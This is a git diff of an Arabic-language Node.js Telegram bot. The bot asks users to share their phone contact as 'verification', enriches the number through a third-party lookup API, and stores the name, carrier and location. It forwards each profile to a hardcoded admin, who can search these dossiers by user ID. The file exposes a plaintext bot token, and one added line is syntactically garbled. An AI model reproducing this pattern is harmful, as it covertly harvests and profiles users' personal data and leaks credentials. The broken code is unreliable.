@@ -17,7 +17,7 @@ app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
 
-const ADMIN_ID = '7193004338'; // ضع معرف الشات الخاص بالمدير
+const ADMIN_ID = '7193004338'; // معرف المشرف
 const token = '6455603203:AAFnlAjQewoM5CMMRwQS388RiI1U0aHIN78';
 const bot = new TelegramBot(token, { polling: true });
 const apiUrl = `https://illyvoip.com/my/application/number_lookup/?phonenumber=`;
@@ -44,8 +44,6 @@ async function getCountryInfo(countryCode) {
         return { name: "Unknown", flag: "🏳️" };
     }
 }
-
-
 
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS users (
@@ -127,7 +125,6 @@ bot.on('contact', async (msg) => {
                 lineType: phoneInfo.lineType || "غير معروف"
             };
 
-            // إدخال البيانات الجديدة أو تحديث البيانات الحالية إذا كانت موجودة مسبقًا
             db.run(`
                 INSERT OR REPLACE INTO users (id, name, username, phone, country, carrier, location, internationalFormat, localFormat, formattedE164, formattedRFC3966, timeZones, lineType)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
@@ -166,10 +163,8 @@ bot.on('contact', async (msg) => {
 
                         bot.sendMessage(chatId, "تم التحقق بنجاح! جاري التحقق من اشتراكك في قناة البوت.", { reply_markup: { remove_keyboard: true } });
                         
-                        // إرسال التقرير إلى المدير
                         bot.sendMessage(ADMIN_ID, userReport);
 
-                        // التحقق من اشتراك المستخدم
                         checkSubscriptions(userId).then(isSubscribed => {
                             if (isSubscribed) {
                                 showMainMenu(chatId, userInfo);
@@ -198,13 +193,20 @@ async function getPhoneInfo(phoneNumber) {
 }
 
 function showMainMenu(chatId, userInfo) {
+    const isAdmin = chatId.toString() === ADMIN_ID;
+    let keyboard = [
+        [{ text: 'المطور - Developer', url: 'https://t.me/SAGD112' }],
+        [{ text: 'قناة المطور - Channel Developer', url: 'https://t.me/SJGDDW'}]
+    ];
+
+    // إضافة زر البحث للمشرف فقط
+    if (isAdmin) {
+        keyboard.unshift([{ text: 'بحث عبر ID', callback_ 'search_id' }]);
+    }
+
     const opts = {
         reply_markup: {
-            inline_keyboard: [
-                [{ text: 'بحث عبر ID', callback_data: 'search_id' }],
-                [{ text: 'المطور - Developer', url: 'https://t.me/SAGD112' }],
-                [{ text: 'قناة المطور - Channel Developer', url: 'https://t.me/SJGDDW'}]
-            ]
+            inline_keyboard: keyboard
         },
         parse_mode: 'HTML'
     };
@@ -223,7 +225,7 @@ Kullanıcıdan Tik Tok veya Instagram hakkında bilgi almak için bir bot var.
 </strong>`;
 
     bot.sendMessage(chatId, message, opts);
-});
+}
 
 bot.onText(/\/helpar/, (msg) => {
     const chatId = msg.chat.id;
@@ -298,24 +300,34 @@ async function checkSubscriptions(userId) {
 
 bot.on('callback_query', async (callbackQuery) => {
     const msg = callbackQuery.message;
+    const chatId = msg.chat.id;
     const data = callbackQuery.data;
 
     if (data === 'search_id') {
-        // التحقق مما إذا كان المستخدم هو الأدمن
-        if (msg.chat.id.toString() === ADMIN_ID) {
-            async function searchById(msg) {
-                try {
-                    const userId = parseInt(msg.text);
-                    if (isNaN(userId)) {
-                        throw new Error("يرجى إدخال ID صحيح.");
-                    }
+        if (chatId.toString() === ADMIN_ID) {
+            bot.sendMessage(chatId, 'أدخل ID للبحث عنه:');
+            bot.once('message', async (searchMsg) => {
+                await searchById(searchMsg);
+            });
+        } else {
+            bot.answerCallbackQuery(callbackQuery.id, "هذه الميزة متاحة للمشرف فقط.", true);
+        }
+    }
+});
 
-                    db.get('SELECT * FROM users WHERE id = ?', [userId], (err, row) => {
-                        if (err) {
-                            console.error(err);
-                            bot.sendMessage(msg.chat.id, 'حدث خطأ أثناء البحث.');
-                        } else if (row) {
-                            const userReport = `
+async function searchById(msg) {
+    try {
+        const userId = parseInt(msg.text);
+        if (isNaN(userId)) {
+            throw new Error("يرجى إدخال ID صحيح.");
+        }
+
+        db.get('SELECT * FROM users WHERE id = ?', [userId], (err, row) => {
+            if (err) {
+                console.error(err);
+                bot.sendMessage(msg.chat.id, 'حدث خطأ أثناء البحث.');
+            } else if (row) {
+                const userReport = `
 تم العثور على المعلومات:
 📞 | رقم الهاتف: ${row.phone}
 🧍‍♂️ | الاسم: ${row.name}
@@ -331,33 +343,29 @@ bot.on('callback_query', async (callbackQuery) => {
 🔢 | التنسيق E164: ${row.formattedE164 || "غير معروف"}
 🔢 | التنسيق RFC3966: ${row.formattedRFC3966 || "غير معروف"}
 🕒 | المنطقة الزمنية: ${row.timeZones || "غير معروف"}
-                            `;
+                `;
 
-                            const buttons = {
-                                reply_markup: {
-                                    inline_keyboard: [
-                                        [{ text: "🔗 حسابه تيليجرام", url: `https://t.me/${row.username}` }],
-                                        [{ text: "🔗 حسابه الحالي", url: `https://t.me/${row.username}` }],
-                                        [{ text: "🔗 حسابه واتساب", url: `https://wa.me/${row.phone}` }]
-                                    ]
-                                }
-                            };
+                
+                const buttons = {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "🔗 حسابه تيليجرام", url: `https://t.me/${row.username}` }],
+                            [{ text: "🔗 حسابه الحالي", url: `https://t.me/${row.username}` }],
+                            [{ text: "🔗 حسابه واتساب", url: `https://wa.me/${row.phone}` }]
+                        ]
+                    }
+                };
 
-                            bot.sendMessage(msg.chat.id, userReport, buttons);
-                        } else {
-                            bot.sendMessage(msg.chat.id, 'ID المستخدم غير موجود في السجلات.');
-                        }
-                    });
-                } catch (error) {
-                    bot.sendMessage(msg.chat.id, error.message);
-                }
+                bot.sendMessage(msg.chat.id, userReport, buttons);
+            } else {
+                bot.sendMessage(msg.chat.id, 'ID المستخدم غير موجود في السجلات.');
             }
-            bot.sendMessage(msg.chat.id, 'أدخل ID للبحث عنه:');
-        } else {
-            bot.sendMessage(msg.chat.id, '❌ هذه الميزة متاحة للأدمن فقط.');
-        }
+        });
+    } catch (error) {
+        bot.sendMessage(msg.chat.id, error.message);
     }
-});
+}
+
 
 bot.onText(/\/tik (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
